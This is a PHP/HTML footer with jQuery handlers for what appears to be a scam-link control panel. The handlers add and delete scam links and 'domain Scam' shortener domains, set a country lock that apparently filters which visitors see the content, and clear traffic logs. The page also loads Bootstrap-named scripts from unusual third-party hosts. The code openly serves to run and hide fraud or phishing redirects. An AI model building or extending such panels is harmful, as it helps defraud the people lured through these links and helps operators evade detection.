<!-- footer start-->
<footer class="footer mt-2">
    <div class="container-fluid">
        <div class="row">
            <div class="col-md-12 footer-copyright text-center">
                <p class="mb-0">Copyright <?= date('Y'); ?> © Natama</p>
            </div>
        </div>
    </div>
</footer>
<!-- footer end-->

<!-- latest jquery-->
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<?php

if (@$_GET['msg'] == "success_login") {
    echo "<script>
Swal.fire({
    icon: 'success',
    title: 'Berhasil',
    text: 'Anda berhasil Login!'
  })
</script>";
}
?>
<!-- Start index.php-->
<script>
    $(function() {
        $('#mode').change(function() {
            var check = $(this).prop('checked');
            $.ajax({
                url: 'autoloaders.php',
                type: 'POST',
                data: {
                    mode: check
                },
                success: function() {
                    window.location.reload();
                }
            })
        })
    })
</script>
<script>
    $(function() {
        $('#linkscam').click(function() {
            var link = $('input[name=link]').val();
            if (link == '' || link == null || link == ' ') {
                Swal.fire({
                    icon: 'error',
                    title: 'Oops...',
                    text: 'Link Scam Tidak Boleh Kosong!'
                })
                return false;
            } else {

                $.ajax({
                    url: 'autoloaders.php',
                    type: 'POST',
                    data: {
                        link: link
                    },
                    success: function() {
                        Swal.fire(
                            'Good job!',
                            'Add domain Scam Success!',
                            'success'
                        )
                        setTimeout(function() {
                            window.location.reload();
                        }, 2000);
                    }
                })
            }
        })
    })
</script>
<script>
    $(function() {
        $('#countrylock').click(function() {
            var lockc = document.getElementById("lock_country");
            var code_country = lockc.value;
            Swal.fire({
                title: 'Are you sure?',
                text: "Kamu akan mengganti dengan kode " + code_country,
                icon: 'warning',
                showCancelButton: true,
                confirmButtonColor: '#3085d6',
                cancelButtonColor: '#d33',
                confirmButtonText: 'Yes, delete it!'
            }).then((result) => {
                if (result.isConfirmed) {
                    $.ajax({
                        url: 'autoloaders.php',
                        type: 'POST',
                        data: {
                            code_country: code_country
                        },
                        success: function() {
                            Swal.fire(
                                'Good job!',
                                'Add Country Lock Success!',
                                'success'
                            )
                            setTimeout(function() {
                                window.location.reload();
                            }, 2000);
                        }
                    })
                }
            })
        })


    })
</script>

<!-- Start domain.php-->
<script>
    $(function() {
        $('#domainshort').click(function() {
            var short = $('input[name=domain_short]').val();
            if (short == '' || short == null || short == ' ') {
                Swal.fire({
                    icon: 'error',
                    title: 'Oops...',
                    text: 'Link domain tidak boleh kosong!'
                })
                return false;
            } else {

                $.ajax({
                    url: 'autoloaders.php',
                    type: 'POST',
                    data: {
                        short: short
                    },
                    success: function() {
                        Swal.fire(
                            'Good job!',
                            'Add domain Scam Success!',
                            'success'
                        )
                        setTimeout(function() {
                            window.location.reload();
                        }, 2000);
                    }
                })
            }
        })
    })
</script>

<script>
    $(document).ready(function() {
        $('.genit').click(function() {
            Swal.fire({
                title: 'Are you sure?',
                text: "Pastikan Link sudah tidak digunakan lagi!",
                icon: 'warning',
                showCancelButton: true,
                confirmButtonColor: '#3085d6',
                cancelButtonColor: '#d33',
                confirmButtonText: 'Yes, delete it!'
            }).then((result) => {
                var id_short = $(this).attr("id");
                if (result.isConfirmed) {
                    $.ajax({
                        url: 'autoloaders.php',
                        type: 'POST',
                        data: {
                            id_short: id_short
                        },
                        success: function() {
                            Swal.fire(
                                'Good job!',
                                'Delete domain Scam Success!',
                                'success'
                            )
                            setTimeout(function() {
                                window.location.reload();
                            }, 2000);
                            console.log(id_short);
                        }
                    })
                }
            })
        })
    })
</script>

<script>
    $(document).ready(function() {
        $('.trash').click(function() {
            Swal.fire({
                title: 'Are you sure?',
                text: "Pastikan Link sudah tidak digunakan lagi!",
                icon: 'warning',
                showCancelButton: true,
                confirmButtonColor: '#3085d6',
                cancelButtonColor: '#d33',
                confirmButtonText: 'Yes, delete it!'
            }).then((result) => {
                if (result.isConfirmed) {
                    var id_sc = $(this).attr("id");
                    $.ajax({
                        url: 'autoloaders.php',
                        type: 'POST',
                        data: {
                            id_sc: id_sc
                        },
                        success: function() {
                            Swal.fire(
                                'Good job!',
                                'Delete domain Scam Success!',
                                'success'
                            )
                            setTimeout(function() {
                                window.location.reload();
                            }, 2000);
                        }
                    })
                }
            })
        })
    })
</script>


<script>
    $(document).ready(function() {
        $('.clearz').click(function() {
            Swal.fire({
                title: 'Are you sure?',
                text: "Kamu akan mengahpus log traffic!",
                icon: 'warning',
                showCancelButton: true,
                confirmButtonColor: '#3085d6',
                cancelButtonColor: '#d33',
                confirmButtonText: 'Yes, delete it!'
            }).then((result) => {
                if (result.isConfirmed) {
                    $.ajax({
                        url: 'autoloaders.php',
                        type: 'POST',
                        data: {
                            clearz: 'clearz'
                        },
                        success: function() {
                            Swal.fire(
                                'Good job!',
                                'Delete domain Scam Success!',
                                'success'
                            )
                            setTimeout(function() {
                                window.location.reload();
                            }, 2000);
                        }
                    })
                }
            })
        })
    })
</script>

<!-- Bootstrap js-->
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js" integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r" crossorigin="anonymous">
</script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.min.js" integrity="sha384-fbbOQedDUMZZ5KreZpsbe1LCZPVmfTnH7ois6mU1QK+m14rQ1l2bGBq41eYeM/fS" crossorigin="anonymous">
</script>
<!-- feather icon js-->
<script src="https://cdn.linkpribadi.my.id/assets/js/icons/feather-icon/feather.min.js"></script>
<script src="https://cdn.linkpribadi.my.id/assets/js/icons/feather-icon/feather-icon.js"></script>
<!-- Plugin used-->
<script src="https://cdn.datatables.net/1.13.4/js/jquery.dataTables.min.js"></script>
<script src="https://cdn.datatables.net/1.13.4/js/dataTables.bootstrap5.min.js"></script>
<script src="https://cdn.datatables.net/responsive/2.4.1/js/dataTables.responsive.min.js"></script>
<script src="https://cdn.datatables.net/responsive/2.4.1/js/responsive.bootstrap5.min.js"></script>
<script src="https://svg.sagiri.click/assets/js/bootstrap.bundle.min.js"></script>
<script src="https://svg.sagiri.click/assets/js/bootstrap.min.js"></script>
<script>
    $.fn.dataTable.ext.errMode = 'none';
    $(document).ready(function() {
        $("#datatable").DataTable({
            lengthChange: false,
            pageLength: 3,
            searching: false,
            pagingType: 'simple',
            scrollX: false,
            ordering: false
        });
    });
</script>
<script>
    $.fn.dataTable.ext.errMode = 'none';
    $(document).ready(function() {
        $("#country").DataTable({
            lengthChange: false,
            pageLength: 3,
            searching: true,
            pagingType: 'simple',
            scrollX: false,
            ordering: false
        });
    });
</script>
<script>
    $.fn.dataTable.ext.errMode = 'none';
    $(document).ready(function() {
        $("#visitor").DataTable({
            lengthChange: false,
            pageLength: 3,
            searching: false,
            pagingType: 'simple',
            scrollX: false,
            ordering: false
        });
    });
</script>
<script>
    $.fn.dataTable.ext.errMode = 'none';
    $(document).ready(function() {
        $("#domain-tables").DataTable({
            lengthChange: false,
            pageLength: 10,
            searching: false,
            pagingType: 'simple',
            scrollX: false,
            ordering: false
        });
    });
</script>
</body>

</html>